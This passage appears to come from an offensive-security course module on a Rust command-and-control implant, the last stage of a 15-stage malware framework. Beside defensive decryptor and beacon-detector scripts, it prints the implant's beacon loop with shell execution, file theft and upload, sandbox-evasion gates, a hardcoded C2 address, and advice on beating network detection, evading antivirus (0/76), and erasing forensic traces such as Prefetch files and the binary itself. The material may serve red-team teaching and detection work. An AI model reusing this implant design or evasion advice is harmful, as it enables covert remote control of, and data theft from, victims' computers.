    parser = argparse.ArgumentParser(description="Decrypt Goodboy C2 traffic")
    group = parser.add_mutually_exclusive_group(required=True)
    group.add_argument("--hex", help="Single hex-encoded body")
    group.add_argument("--file", help="File with hex bodies (one per line)")
    group.add_argument("--pcap-json", help="Wireshark JSON export file")
    args = parser.parse_args()

    key = derive_comms_key()
    print(f"[*] Comms key: {key.hex()}")
    print()

    if args.hex:
        result = decrypt_hex_body(args.hex, key)
        print(f"Decrypted: {result}")

    elif args.file:
        with open(args.file) as f:
            for i, line in enumerate(f, 1):
                line = line.strip()
                if not line or line.startswith("#"):
                    continue
                result = decrypt_hex_body(line, key)
                print(f"[{i:03d}] {result}")

    elif args.pcap_json:
        with open(args.pcap_json) as f:
            packets = json.load(f)
        count = 0
        for pkt in packets:
            layers = pkt.get("_source", {}).get("layers", {})
            http = layers.get("http", {})
            if "http.file_data" in http:
                body = http["http.file_data"].replace(":", "")
                count += 1
                direction = "REQUEST" if "http.request" in http else "RESPONSE"
                result = decrypt_hex_body(body, key)
                print(f"[{count:03d}] {direction}: {result}")
        if count == 0:
            print("[!] No HTTP bodies found in JSON export")


if __name__ == "__main__":
    main()
```

### Python Script 3: Beacon Pattern Detector

```python
#!/usr/bin/env python3
"""
beacon_detector.py — Detect C2 beacon patterns in network logs

Analyzes proxy/firewall logs for periodic POST requests characteristic
of the Goodboy C2 agent: fixed path, hex-only body, regular interval.

Usage:
    # Analyze proxy log (CSV with timestamp, method, uri, body columns):
    python3 beacon_detector.py --csv proxy_log.csv

    # Analyze with custom interval range:
    python3 beacon_detector.py --csv proxy_log.csv --min-interval 30 --max-interval 90

    # Generate sample log for testing:
    python3 beacon_detector.py --generate-sample
"""

import argparse
import csv
import json
import math
import re
import sys
from collections import defaultdict
from datetime import datetime, timedelta


def is_hex_only(body: str) -> bool:
    """Check if string consists entirely of hex characters."""
    return bool(re.match(r'^[0-9a-fA-F]+$', body.strip()))


def calculate_jitter(intervals: list[float]) -> dict:
    """Calculate statistical properties of beacon intervals."""
    if len(intervals) < 2:
        return {"count": len(intervals), "sufficient": False}

    mean = sum(intervals) / len(intervals)
    variance = sum((x - mean) ** 2 for x in intervals) / len(intervals)
    stddev = math.sqrt(variance)
    jitter_pct = (stddev / mean * 100) if mean > 0 else 0

    return {
        "count": len(intervals),
        "mean_seconds": round(mean, 1),
        "stddev_seconds": round(stddev, 1),
        "jitter_percent": round(jitter_pct, 1),
        "min_seconds": round(min(intervals), 1),
        "max_seconds": round(max(intervals), 1),
        "sufficient": True,
    }


def detect_beacons(entries: list[dict], min_interval: float, max_interval: float) -> list[dict]:
    """Group log entries by (source_ip, dest, path) and detect periodic patterns."""
    groups = defaultdict(list)
    for e in entries:
        key = (e.get("src_ip", "?"), e.get("dst", "?"), e.get("path", "?"))
        groups[key].append(e)

    findings = []
    for (src, dst, path), group_entries in groups.items():
        if len(group_entries) < 3:
            continue

        # Sort by timestamp
        group_entries.sort(key=lambda x: x["timestamp"])

        # Calculate intervals
        intervals = []
        for i in range(1, len(group_entries)):
            dt = (group_entries[i]["timestamp"] - group_entries[i-1]["timestamp"]).total_seconds()
            intervals.append(dt)

        # Filter to expected interval range
        matching = [iv for iv in intervals if min_interval <= iv <= max_interval]
        if len(matching) < 2:
            continue

        stats = calculate_jitter(matching)

        # Check for hex-only bodies
        hex_bodies = sum(1 for e in group_entries if is_hex_only(e.get("body", "")))
        hex_ratio = hex_bodies / len(group_entries)

        # Scoring
        score = 0
        reasons = []

        if stats["sufficient"] and 20 <= stats["jitter_percent"] <= 40:
            score += 30
            reasons.append(f"jitter {stats['jitter_percent']}% matches 30% band")

        if hex_ratio > 0.8:
            score += 25
            reasons.append(f"hex-only body ratio {hex_ratio:.0%}")

        if path == "/api/v1/telemetry":
            score += 25
            reasons.append("known C2 path /api/v1/telemetry")

        if len(matching) >= 5:
            score += 20
            reasons.append(f"{len(matching)} periodic intervals")

        if score >= 50:
            findings.append({
                "source": src,
                "destination": dst,
                "path": path,
                "score": score,
                "reasons": reasons,
                "stats": stats,
                "beacon_count": len(group_entries),
            })

    return sorted(findings, key=lambda x: x["score"], reverse=True)


def generate_sample():
    """Generate a sample CSV log with embedded beacon pattern."""
    print("timestamp,src_ip,dst,method,path,content_type,body_preview")
    import random
    base = datetime(2026, 3, 15, 10, 0, 0)
    # Normal traffic
    for i in range(20):
        t = base + timedelta(seconds=random.randint(0, 3600))
        print(f"{t.isoformat()},10.0.0.50,api.example.com:443,GET,/api/data,application/json,{{\"ok\":true}}")
    # Beacon traffic (60s +/-30% jitter)
    t = base
    for i in range(15):
        jitter = random.uniform(-18, 18)
        t += timedelta(seconds=60 + jitter)
        body = "a3f5" + "".join(random.choices("0123456789abcdef", k=60))
        print(f"{t.isoformat()},10.0.0.50,163.245.210.119:8443,POST,/api/v1/telemetry,application/json,{body}")


def main():
    parser = argparse.ArgumentParser(description="Detect C2 beacon patterns")
    parser.add_argument("--csv", help="CSV log file to analyze")
    parser.add_argument("--min-interval", type=float, default=30, help="Min beacon interval (seconds)")
    parser.add_argument("--max-interval", type=float, default=90, help="Max beacon interval (seconds)")
    parser.add_argument("--generate-sample", action="store_true", help="Generate sample CSV")
    args = parser.parse_args()

    if args.generate_sample:
        generate_sample()
        return

    if not args.csv:
        parser.error("Either --csv or --generate-sample required")

    entries = []
    with open(args.csv) as f:
        reader = csv.DictReader(f)
        for row in reader:
            try:
                entry = {
                    "timestamp": datetime.fromisoformat(row["timestamp"]),
                    "src_ip": row.get("src_ip", "?"),
                    "dst": row.get("dst", "?"),
                    "method": row.get("method", "?"),
                    "path": row.get("path", "?"),
                    "body": row.get("body_preview", ""),
                }
                if entry["method"] == "POST":
                    entries.append(entry)
            except (ValueError, KeyError):
                continue

    findings = detect_beacons(entries, args.min_interval, args.max_interval)

    if not findings:
        print("[*] No beacon patterns detected")
        return

    for f in findings:
        print(f"\n[!] BEACON DETECTED (score: {f['score']}/100)")
        print(f"    Source: {f['source']}")
        print(f"    Dest:   {f['destination']}")
        print(f"    Path:   {f['path']}")
        print(f"    Count:  {f['beacon_count']} requests")
        s = f["stats"]
        if s["sufficient"]:
            print(f"    Interval: {s['mean_seconds']}s mean, {s['stddev_seconds']}s stddev, {s['jitter_percent']}% jitter")
            print(f"    Range: {s['min_seconds']}s - {s['max_seconds']}s")
        for r in f["reasons"]:
            print(f"    [+] {r}")


if __name__ == "__main__":
    main()
```

### Defense Hardening

**Layer 1 — Network Detection:**
- Deploy Sigma rule for periodic POST to `/api/v1/telemetry` on non-standard ports
- Alert on `Content-Type: application/json` where body fails JSON validation (hex-only bodies)
- Monitor JA3/JA3S fingerprints — WinHTTP + self-signed cert creates a near-unique pair
- Flag HTTPS connections that proceed despite certificate validation failures

**Layer 2 — Host Detection:**
- Sysmon Event 7 (Image Load): alert on `winhttp.dll` loaded by non-browser, non-Windows-service processes
- Sysmon Event 3 (Network Connection): correlate outbound HTTPS to non-standard ports with process image
- Sysmon Event 1 (Process Create): flag processes with `#![windows_subsystem = "windows"]` that have no visible window but make outbound connections
- Monitor `CreateToolhelp32Snapshot` calls from processes that also load `winhttp.dll` — this combination (process enumeration + HTTP client) is characteristic of C2 agents

**Layer 3 — Behavioral Correlation:**
- Build a correlation rule: process loads `winhttp.dll` AND enumerates processes AND makes periodic outbound HTTPS POST = high-confidence C2 indicator
- Track beacon timing: 3+ POST requests to the same path within 10 minutes with interval variance consistent with 30% jitter
- Monitor for the browser-gate pattern: process that calls `GetForegroundWindow` + `GetWindowTextW` in a polling loop before initiating network activity

**Layer 4 — Endpoint Hardening:**
- Application whitelisting (AppLocker/WDAC) prevents unsigned Rust binaries from executing
- Network segmentation: workstations should not make direct HTTPS to arbitrary external IPs on non-standard ports
- DNS sinkholing: if the C2 uses a domain (this one uses an IP), DNS monitoring catches the resolution
- Certificate transparency: require all outbound HTTPS to use CA-signed certificates (breaks self-signed C2)

---

## Section 8: Summary and Full Framework Assessment

### The Complete Goodboy Framework

```
Stage Progression:

  01 Basic XOR Loader         --> Foundation: decrypt + execute
  02 XOR Loader (improved)    --> Multi-byte keys, key management
  03 AES Loader               --> Real cryptography, key derivation
  04 API Hashing              --> Dynamic API resolution, no IAT
  05 Process Injection        --> Cross-process execution
  06 EarlyBird APC            --> Pre-main injection technique
  07 Direct Syscalls          --> Bypass ntdll hooks
  08 Indirect Syscalls        --> Clean call stacks
  09 Anti-Debug               --> Analyst detection + evasion
  10 Anti-Sandbox             --> Automated analysis evasion
  11 Persistence              --> Survival across reboots
  12 Module Stomping          --> Execution from trusted modules
  13 Sleep Obfuscation        --> Payload encryption at rest
  14 Combined Loader          --> All techniques orchestrated
  15 C2 Agent (this)          --> Full operational implant
```

### Key Takeaways

```
+-----------------------------------------------------------+
| C2 Agent Architecture Principles                            |
+-----------------------------------------------------------+
|                                                           |
| 1. COMMUNICATIONS                                        |
|    XOR encrypt -> hex encode -> HTTPS POST                |
|    WinHTTP loaded dynamically (no static IAT entry)       |
|    Self-signed cert with validation disabled               |
|    Chrome 131 User-Agent for traffic blending             |
|    /api/v1/telemetry path mimics legitimate telemetry API |
|    Content-Type: application/json (normal header)         |
|                                                           |
| 2. KEY DERIVATION                                        |
|    Arithmetic PRNG: seed * 0x1337CAFE + 0xDEADBEEF       |
|    Zero .rdata footprint (no hardcoded key arrays)        |
|    black_box prevents constant folding                    |
|    32-byte key from 3 constants vs. 64 bytes from 8 fns  |
|                                                           |
| 3. COMMAND DISPATCH                                      |
|    9 commands: nop, shell, download, upload, proclist,    |
|    sleep, persist(stub), uninstall(stub), selfdestruct    |
|    String-matching parser (no JSON library dependency)    |
|    Results carried in next beacon's check-in              |
|    Persist/uninstall are stubs (code mass too costly)     |
|                                                           |
| 4. RESILIENCE                                            |
|    Jittered beacon interval (+/-30%, rdtsc-based)         |
|    Failure counter with graceful shutdown (10 max)        |
|    Server-adjustable sleep interval                       |
|    Browser-gate skips silently (no failure increment)     |
|                                                           |
| 5. SANDBOX EVASION                                       |
|    Browser-gate: only beacon when browser is running      |
|    Tab-activity gate: 3 unique titles proves human        |
|    Startup delay: 5-15s rdtsc-based                       |
|    init_environment(): benign std code mass               |
|                                                           |
| 6. SELF-CONTAINED BINARY                                 |
|    Zero common library dependency                         |
|    Inline XOR crypto (no shared AES implementation)       |
|    PRNG key derivation (no MBA / fragment functions)      |
|    No obf! macro, no iat_pad, no ballast                 |
|    Result: genuinely clean PE with no shared signatures   |
|                                                           |
| 7. DETECTION SURFACES                                    |
|    Periodic HTTPS POST pattern (beacon timing)            |
|    Hex-only body with JSON Content-Type (mismatch)        |
|    Self-signed cert + non-standard port (8443)            |
|    WinHTTP loaded by non-browser process                  |
|    JA3/JA3S TLS fingerprint pair                          |
|    Process enum + WinHTTP load = C2 behavioral sig        |
|                                                           |
+-----------------------------------------------------------+
```

---

## Section 9: Source Code Deep Dive

### The Beacon Loop

The agent's core is an infinite loop gated by browser presence. When a browser is running, it beacons. When not, it stays silent.

```
Beacon loop (from main.rs, lines 503-561):

loop {
    // Only beacon when a browser is running
    if is_browser_active() {
        let response = beacon(&state, last_result.as_deref());
        last_result = None;

        match response {
            Some(decrypted) => {
                state.consecutive_failures = 0;  // Reset dead-man counter
                let cmd = parse_command(&decrypted);

                match cmd {
                    Nop           => {}
                    Shell(cmd)    => last_result = Some(execute_shell(&cmd)),
                    Download(p)   => last_result = Some(format!("F:{}:{}", p, hex_encode(&read_file(&p)))),
                    Upload(p, d)  => last_result = Some(format!("U:{}:{}", p, if write_file(&p, &d) { "1" } else { "0" })),
                    ProcessList   => last_result = Some(list_processes()),
                    Sleep(ms)     => { state.beacon_interval = ms; last_result = Some(format!("S:{}", ms)); }
                    Persist       => last_result = Some(String::from("P:D")),
                    Uninstall     => last_result = Some(String::from("U:1")),
                    SelfDestruct  => std::process::exit(0),
                    Unknown       => last_result = Some(String::from("?")),
                }
            }
            None => {
                state.consecutive_failures += 1;
                if state.consecutive_failures >= MAX_FAILURES {
                    return;  // Dead-man switch
                }
            }
        }
    }
    // No browser = stay silent, no failure count, keep last_result queued

    let sleep_ms = jittered_interval(state.beacon_interval, JITTER_PERCENT);
    std::thread::sleep(Duration::from_millis(sleep_ms as u64));
}
```

Key design points:
- **Browser check is per-cycle**: If the user closes their browser, the agent goes dormant. Reopening the browser resumes beaconing. This is NOT a one-time gate.
- **Silent skip preserves state**: When no browser is active, `last_result` stays queued. It will be delivered on the next successful beacon.
- **No failure increment on skip**: Only network failures (beacon returns `None`) count toward the dead-man threshold. Browser absence is not a failure.

### WinHTTP Dynamic Loading

```
WinHTTP initialization (from main.rs, lines 380-402):

fn load_winhttp() -> Option<WinHttpApi> {
    let hmod = LoadLibraryA(b"winhttp.dll\0".as_ptr());
    if hmod.is_null() { return None; }

    macro_rules! resolve {
        ($name:expr) => {
            core::mem::transmute(GetProcAddress(hmod, $name.as_ptr())?)
        };
    }

    Some(WinHttpApi {
        open:             resolve!(b"WinHttpOpen\0"),
        connect:          resolve!(b"WinHttpConnect\0"),
        open_request:     resolve!(b"WinHttpOpenRequest\0"),
        send_request:     resolve!(b"WinHttpSendRequest\0"),
        receive_response: resolve!(b"WinHttpReceiveResponse\0"),
        read_data:        resolve!(b"WinHttpReadData\0"),
        close_handle:     resolve!(b"WinHttpCloseHandle\0"),
        set_option:       resolve!(b"WinHttpSetOption\0"),
    })
}
```

The `resolve!` macro uses the `?` operator on `GetProcAddress` — if any single function can't be resolved, the entire `load_winhttp()` returns `None`, and the beacon fails gracefully. WinHTTP is loaded **fresh on every beacon call** (line 417: `let http = load_winhttp()?;`), not cached. This means the DLL handles are created and destroyed per beacon cycle.

### The Beacon Function

```
beacon() flow (from main.rs, lines 404-483):

1. Build JSON check-in:
   {"id":"A7F3B2C1","result":"<escaped previous output>"}

2. XOR encrypt with comms_key → ciphertext bytes
3. Hex encode ciphertext → ASCII string

4. Load WinHTTP (fresh per call)
5. WinHttpOpen with Chrome 131 User-Agent
6. WinHttpConnect to c2_server():c2_port()
7. WinHttpOpenRequest("POST", "/api/v1/telemetry", WINHTTP_FLAG_SECURE)
8. WinHttpSetOption → disable cert validation (0x3300)
9. WinHttpSendRequest with "Content-Type: application/json" header
10. WinHttpReceiveResponse
11. WinHttpReadData in 4096-byte chunks → response_data

12. Hex decode response body
13. XOR decrypt with comms_key → plaintext command JSON
14. Close all handles (request, connection, session)
15. Return Some(decrypted) or None on any failure
```

Every WinHTTP handle is explicitly closed in order (request → connection → session) on both success and failure paths. There are 5 separate failure exit points in the function, each closing only the handles that were successfully opened up to that point.

### FNV-1a Agent ID

```
Agent ID derivation (from main.rs, lines 135-144):

fn agent_id() -> String {
    let cn = env::var("COMPUTERNAME").unwrap_or_default();
    let un = env::var("USERNAME").unwrap_or_default();
    let mut h: u32 = 0x811c_9dc5;    // FNV offset basis
    for b in cn.bytes().chain(un.bytes()) {
        h ^= b as u32;
        h = h.wrapping_mul(0x0100_0193);  // FNV prime
    }
    format!("{:08X}", h)
}
```

FNV-1a produces a deterministic 32-bit hash from COMPUTERNAME + USERNAME concatenation. The same machine with the same logged-in user always generates the same agent ID, allowing the C2 server to track agents across restarts without persistent state on the host.

Note: the format is raw hex (`A7F3B2C1`), NOT prefixed with `AGENT-`. This keeps the ID compact and avoids the obvious `AGENT-` marker in memory/network traffic.

### PRNG Key Derivation

```
Key derivation (from main.rs, lines 147-157):

fn derive_comms_key() -> [u8; 32] {
    let mut key = [0u8; 32];
    let mut val = black_box(0x5A3C_F7E1u32);
    for i in 0..32 {
        val = val.wrapping_mul(black_box(0x1337_CAFEu32))
                 .wrapping_add(black_box(0xDEAD_BEEFu32));
        key[i] = (val >> 16) as u8;
    }
    black_box(key)
}
```

This is a linear congruential generator (LCG) — the simplest deterministic PRNG. The `>> 16` shift takes bits 16-23 of each iteration, which are the highest-quality bits in an LCG output. The `black_box` calls on both the constants and the final key prevent the compiler from:
1. Constant-folding the loop into a static 32-byte array in `.rdata`
2. Inlining the function and exposing the key at the call site

### Jitter Implementation

```
Jitter (from main.rs, lines 343-352):

fn jittered_interval(base_ms: u32, jitter_pct: u32) -> u32 {
    jitter_range = base_ms * jitter_pct / 100     // 60000 * 30 / 100 = 18000
    rdtsc_val = RDTSC (inline asm, low 32 bits)
    random = rdtsc_val % (jitter_range * 2)        // 0..35999
    offset = random - jitter_range                 // -18000..+17999
    result = max(base_ms + offset, 1000)           // 42000..78000, min 1000ms
}
```

The jitter source is `RDTSC` (CPU timestamp counter) — not a cryptographically secure random source, but sufficient for timing variation. The minimum clamp at 1000ms prevents zero or negative sleep durations.

---

## Section 10: Adversarial Thinking

### Challenge 1: Defeating Beacon Traffic Analysis

**Scenario**: A network defender captures your beacon traffic. The hex-encoded ciphertext has distinctive patterns: periodic POSTs to the same path, always to the same IP on port 8443, with hex-only bodies that don't match the `application/json` Content-Type. How do you make traffic less detectable?

<details>
<summary>Network OPSEC improvements</summary>

1. **Fix the Content-Type mismatch**: Wrap the hex payload inside valid JSON: `{"status":"ok","data":"<hex>","ts":"2026-03-18T..."}`. Now the body IS valid JSON, and the Content-Type matches. NDR tools that validate body format against Content-Type will pass it.

2. **Base64 instead of hex**: Base64 encoding (4 bytes → 6 chars) is more compact than hex (1 byte → 2 chars) and appears in millions of legitimate JSON API payloads (image uploads, JWT tokens, encrypted fields). A `"data":"dGVzdA=="` field in a JSON body is invisible.

3. **Domain fronting**: Route traffic through a CDN (CloudFront, Cloudflare, Fastly). The TLS SNI and DNS point to a legitimate high-reputation domain. The HTTP Host header (inside the encrypted tunnel) points to the actual C2 server. Network defenders see HTTPS traffic to `cdn.example.com`, not to a suspicious IP on port 8443.

4. **Rotate beacon path per request**: Instead of always hitting `/api/v1/telemetry`, derive the path from the current timestamp: `/api/v1/events/<date_hash>`, `/metrics/<random>`, `/health/<nonce>`. The C2 server routes all paths to the same handler.

5. **Use port 443 instead of 8443**: Non-standard ports are immediately suspicious. Port 443 blends with the vast majority of HTTPS traffic. Combined with domain fronting, the traffic is indistinguishable from normal web browsing.

6. **Variable payload padding**: Add random-length padding before encryption to vary the ciphertext length. This defeats length-based beacon correlation.
</details>

### Challenge 2: Server Environments Without Browsers

**Scenario**: The browser-gate requires a running browser. On a headless server (Windows Server Core, no desktop experience), no browser is ever running. The agent never activates. How do you handle servers?

<details>
<summary>Server-aware gating</summary>

1. **Detect server vs workstation**: Query `HKLM\SYSTEM\CurrentControlSet\Control\ProductOptions\ProductType`. Values: `WinNT` = workstation, `ServerNT` = domain controller, `LanmanNT` = server. Choose the gate strategy based on the platform type.

2. **Alternative server gate — service processes**: On servers, check for common server workload processes instead of browsers. `sqlservr.exe` (SQL Server), `w3wp.exe` (IIS worker), `java.exe` (Tomcat/Jenkins) — any of these indicates a real production server, not a sandbox. Require 2+ unique service processes.

3. **RDP session gate**: On servers, wait for an active RDP session (check with `WTSEnumerateSessionsW` for sessions with `WTSActive` state). A real server eventually has an admin RDP session; a sandbox does not.

4. **Network activity gate**: Monitor outbound connections using `GetTcpTable2`. A production server has established connections to databases, clients, load balancers. A sandbox has minimal network activity. Require N+ established TCP connections before activating.

5. **Dual configuration**: Detect the platform type at startup and select the appropriate gate. Workstation = browser-gate. Server = service-process gate. This increases code mass slightly but ensures the agent works on both platforms.
</details>

### Challenge 3: Forensic Artifacts After Dead-Man Shutdown

**Scenario**: Your C2 server is taken down. After ~13 minutes (10 failures x 78s max jitter), the agent shuts down. An IR team arrives 15 minutes later and finds no running process. What forensic artifacts remain?

<details>
<summary>Artifact inventory</summary>

**Volatile artifacts (lost after reboot):**
- DNS cache entries for the C2 IP (if it was resolved from a domain — this agent uses a direct IP, so no DNS cache entry)
- Open TCP connection logs (if Sysmon was running, Event ID 3 captured each outbound connection to 163.245.210.119:8443)
- Prefetch file: `C:\Windows\Prefetch\C2-AGENT.EXE-<hash>.pf` — proves the binary was executed, includes last 8 run timestamps and loaded DLLs (including winhttp.dll)

**Persistent artifacts (survive reboot):**
- The breadcrumb file: `%TEMP%\wshostcfg.tmp` — written by `init_environment()` at startup, contains a number (the count of environment variables). This file proves the agent ran.
- The binary itself: the agent does not delete itself on shutdown (selfdestruct is just `exit(0)`). The PE file remains on disk.
- Sysmon logs: Process creation (Event 1), network connections (Event 3), image loads (Event 7 — winhttp.dll load via LoadLibraryA)
- Windows Event Logs: Security log 4688 (process creation with command line if audit policy enables it)
- NTFS artifacts: $MFT entry for the binary, $UsnJrnl change journal entries, $LogFile transaction records

**NOT present (unlike previous stages):**
- No registry modifications (persist command is a stub)
- No scheduled tasks
- No COM hijack keys
- No WMI event subscriptions
- No child cmd.exe processes (unless shell command was executed)
- No ping+del self-destruct pattern

**Minimizing artifacts for production:**
- Don't write breadcrumb files (remove `init_environment()` or make it write to memory only)
- Use DNS-over-HTTPS for C2 resolution if using a domain
- Delete the binary via a final `shell` command before `selfdestruct`
- Clear Prefetch: `del C:\Windows\Prefetch\C2-AGENT*`
</details>

---

## Section 11: Dynamic Analysis Walkthrough

### Full 4-Pass Analysis Strategy

**Pass 1: Unmodified — observe gating behavior**

Run the binary in a monitored sandbox (Procmon + Sysmon + Wireshark). Without a browser running, the binary will block indefinitely at `wait_for_tab_activity()`. Check:
- Procmon: CreateToolhelp32Snapshot calls (process enumeration for browser detection)
- Procmon: GetForegroundWindow polling every 2 seconds
- `%TEMP%\wshostcfg.tmp`: written by init_environment() — confirms execution started
- No outbound network connections (agent hasn't passed the browser-gate)

**Pass 2: Bypass browser-gate — launch browser + switch tabs**

Start a browser (Chrome, Edge, Firefox) and switch between 3+ tabs while the agent is running. Once the tab-activity gate passes (3 unique window titles observed), the agent enters the beacon loop. Observe:
- Wireshark: HTTPS POST to 163.245.210.119:8443 (connection will fail — non-existent server)
- Procmon: LoadLibraryA("winhttp.dll") on each beacon attempt
- The agent accumulates consecutive_failures until MAX_FAILURES=10, then exits

**Pass 3: With mock C2 server**

Run `mock_c2_server.py` on a local machine (or redirect 163.245.210.119 via hosts file). Observe full protocol:
1. Agent checks in: hex-encoded XOR-encrypted JSON
2. Server responds with encrypted command
3. Agent executes command and carries result in next check-in
4. Test commands: `{"cmd":"shell","args":"whoami"}`, `{"cmd":"proclist"}`, `{"cmd":"sleep","args":"5000"}`

**Pass 4: Key extraction via static analysis**

In Ghidra/IDA, find `derive_comms_key()`:
1. Search for the PRNG constants: `0x5A3CF7E1`, `0x1337CAFE`, `0xDEADBEEF`
2. The function contains a 32-iteration loop with `imul` + `add` + `shr 16`
3. Extract the key by reimplementing the PRNG in Python (see `traffic_decryptor.py`)
4. With the key, decrypt all captured traffic offline

### Verification Checklist

| Step | What to Verify | Expected Result |
|------|---------------|-----------------|
| 1 | Run without browser | Agent blocks at tab-activity gate, no network traffic |
| 2 | Open browser + 3 tabs | Agent passes gate, begins beacon attempts |
| 3 | Check %TEMP% | `wshostcfg.tmp` exists (init_environment proof) |
| 4 | Wireshark capture | HTTPS POST to :8443, hex-only body |
| 5 | Procmon filter | LoadLibraryA winhttp.dll per beacon cycle |
| 6 | Run with mock C2 | Check-in decrypts to valid JSON |
| 7 | Send shell command | Agent executes and returns output in next beacon |
| 8 | Kill mock C2 | Agent exits after 10 failures (~7-13 minutes) |
| 9 | Static analysis | PRNG constants visible, key derivable |

---

## Lab Environment Notes

### Required Setup

- Windows 10/11 VM with:
  - All tools from previous modules
  - Python 3 with `ssl`, `http.server` for mock C2
  - Wireshark for traffic capture
  - mitmproxy for HTTPS interception
  - Self-signed certificate (`openssl req -x509 -newkey rsa:2048 -keyout key.pem -out cert.pem -days 365 -nodes -subj "/CN=localhost"`)
  - A web browser installed (Chrome, Edge, or Firefox)

### Capstone Exercise: Build a Mock C2 Server

Implement a Python HTTPS server that:
1. Accepts POST requests on `/api/v1/telemetry`
2. Hex-decodes the request body
3. XOR-decrypts with the PRNG-derived comms key
4. Parses the check-in JSON
5. Sends back an encrypted command (start with "nop", then try "shell")
6. Receives the command result in the next beacon

This exercise validates your understanding of the entire protocol stack — if your server can communicate with the agent, you've fully reversed the C2 protocol. A reference implementation is provided in the Python Scripts section above.

---

### Common Misconceptions

| What People Believe | What's Actually True |
|--------------------|----------------------|
| "Dynamic WinHTTP loading is suspicious" | WinHTTP is used by Windows Update, Microsoft Edge, OneDrive, and hundreds of legitimate apps. `LoadLibraryA("winhttp.dll")` + GetProcAddress for WinHTTP functions is standard for optional DLL dependencies. NOT ONE engine flagged this pattern |
| "A static XOR key means the comms are trivially broken" | Only if the analyst has the binary. The encryption protects against NETWORK-LEVEL detection (NDR, IDS, proxy inspection), not binary analysis. An analyst who can reverse the binary can extract the key — but the encryption still defeated all automated network analysis |
| "Self-signed certificates are an obvious IOC" | True, but the alternative (CA-signed cert) requires domain registration, payment, and creates a paper trail. Domain fronting through a CDN is better but adds complexity. The real detection is the JA3/JA3S fingerprint pair, not the certificate itself |
| "The common library saves code and reduces binary size" | For the c2-agent, the common library was the DETECTION VECTOR. Its AES implementation + MBA XOR + 8 key fragment functions created ESET GenKryptik.HPRQ. Eliminating the dependency entirely (nuclear option) dropped detections to 0/76. Shared offensive code libraries create shared signatures |
| "Anti-forensic code improves OPSEC" | write_volatile + compiler_fence (secure_zero) and CREATE_NO_WINDOW (0x08000000) are TEXTBOOK offensive patterns. Adding them to the clean 0/76 c2-agent caused 1/76 (ESET GenKryptik.HPRQ). Anti-forensic code IS a malware signature. The c2-agent stays clean by NOT including it |
| "Browser-gate only helps with sandbox evasion" | The browser-gate provides a TRIPLE bypass: (1) Sandbox evasion — no browser in sandbox means no network activity to analyze, (2) Traffic blending — agent HTTPS mixes with browser's existing connections on the wire, (3) NDR evasion — no anomalous outbound HTTPS on idle systems |
| "More evasion modules = better evasion" | Every evasion module adds code mass that ML classifiers aggregate. The c2-agent has ZERO evasion modules from the common library — no iat_pad, no ballast, no anti-debug, no anti-sandbox, no AMSI/ETW bypass. It achieves 0/76 through architectural minimalism, not feature density |
| "XOR is too weak for real C2 comms" | XOR's weakness is key recovery via known-plaintext attack (the JSON structure is partially predictable). But the threat model for C2 encryption is network-level automated detection, not targeted cryptanalysis. AES was actually WORSE because the implementation code itself became a detection signature |

### Course Complete — The Full Framework Assessment

This is the final stage. The 15-stage progression from basic XOR loader to operational C2 agent demonstrates the complete lifecycle of offensive tool development:

```
EVASION EVOLUTION ACROSS 15 STAGES:

Stage  Technique              Key Lesson
-----  ---------------------  -----------------------------------
01     Basic XOR              Foundation: decrypt + execute
02     XOR (improved)         Multi-byte keys, key management
03     AES Loader             Real crypto (burned by submissions)
04     API Hashing            Dynamic API resolution, no IAT
05     Process Injection      Cross-process execution
06     EarlyBird APC          Pre-main injection
07     Direct Syscalls        Bypass ntdll hooks
08     Indirect Syscalls      Clean call stacks
09     Anti-Debug             Analyst detection
10     Anti-Sandbox           Automated analysis evasion
11     Persistence            Reboot survival
12     Module Stomping        Trusted module execution
13     Sleep Obfuscation      Payload encryption at rest
14     Combined Loader        All techniques orchestrated
15     C2 Agent               Full operational implant
```

**The meta-lesson**: Every binary that achieved 0/76 did so through SUBTRACTION, not addition. Removing iat_pad, ballast, full_install(), anti-forensic code, string-based VM checks, and eventually the entire common library dependency produced cleaner results than adding more evasion layers. The most evasive binary is the one with the least offensive code — because ML classifiers work on aggregate code mass, not individual techniques.

### MITRE ATT&CK Mapping

| Technique | ID | How It's Used |
|-----------|----|---------------|
| Application Layer Protocol: Web Protocols | T1071.001 | HTTPS POST beaconing to /api/v1/telemetry with Chrome 131 User-Agent |
| Encrypted Channel: Symmetric Cryptography | T1573.001 | XOR-encrypted + hex-encoded request/response bodies |
| Windows Command Shell | T1059.003 | Shell command execution via cmd.exe /c |
| Exfiltration Over C2 Channel | T1041 | Download command reads files and hex-encodes into beacon response |
| Ingress Tool Transfer | T1105 | Upload command writes hex-decoded data to disk |
| Process Discovery | T1057 | ProcessList command (tasklist /FO CSV) + browser PID enumeration (CreateToolhelp32Snapshot) |
| Virtualization/Sandbox Evasion: User Activity Based Checks | T1497.002 | Browser-gate + tab-activity gate (3 unique window titles required) |
| Data Encoding: Standard Encoding | T1132.001 | Hex encoding of all C2 traffic |
| Masquerading | T1036 | init_environment() generates benign file/registry activity patterns |

### Further Reading (2025-2026)

**C2 framework architecture:**
- [Alpha Hunt: C2 Frameworks](https://alphahunt.io/) — Comparative analysis of Havoc, Mythic, Sliver, and Cobalt Strike beacon architectures
- [The C2 Matrix](https://www.thec2matrix.com/) — Feature comparison across 100+ C2 frameworks
- [Cobalt Strike 4.11 Release](https://www.cobaltstrike.com/blog/) — Indirect syscalls + Sleepmask V3 + BOF improvements (May 2025)

**Traffic analysis and detection:**
- [JA3 Fingerprinting](https://github.com/salesforce/ja3) — TLS client fingerprinting that persists across domain/port/path changes
- [JARM](https://github.com/salesforce/jarm) — Active TLS server fingerprinting for C2 infrastructure identification
- [Malleable C2 Profiles](https://hstechdocs.helpsystems.com/manuals/cobaltstrike/current/userguide/content/topics/malleable-c2_main.htm) — Traffic shaping techniques to defeat network signatures

**Evasion and ML bypass:**
- [CrowdStrike EMBER2024](https://www.crowdstrike.com/en-us/blog/ember-2024-advancing-cybersecurity-ml-training-on-evasive-malware/) — How ML classifiers train on aggregate code mass
- [WindShock: Endpoint Evasion 2020-2025](https://windshock.github.io/en/post/2025-05-28-endpoint-security-evasion-techniques-20202025/) — Evolution of evasion from signature bypass to ML adversarial techniques
